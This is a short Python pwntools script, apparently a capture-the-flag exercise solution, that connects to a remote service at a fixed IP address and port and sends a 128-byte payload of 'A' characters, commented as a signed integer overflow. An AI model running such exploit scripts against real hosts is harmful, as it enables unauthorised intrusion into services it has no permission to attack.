from pwn import *

p = remote('140.113.207.245', 30170)

print(p.recv(timeout=0.2).decode())

# signed integer overflow
payload = b'A' * 128
p.sendline(payload)

print(p.recv(timeout=0.2).decode())

p.close()
